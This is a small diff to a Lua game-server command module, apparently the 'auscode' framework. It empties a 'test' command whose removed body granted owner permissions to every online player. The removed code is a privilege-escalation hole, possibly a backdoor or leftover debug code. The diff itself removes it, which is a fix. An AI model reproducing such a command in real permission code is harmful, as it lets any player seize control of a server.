@@ -501,10 +501,7 @@ function auscode.commands:_createCommands()
     end))
 
     self:add(modules.services.command:create("test", {}, {}, "\n \\ Test Command", function (player, full_message, command, args, hasPerm)
-        local players = modules.services.player:getOnlinePlayers()
-        for playerId, player in pairs(players) do
-            player:setPerm("owner", true)
-        end
+        
     end))
 
     self.onCommandCreation:fire()
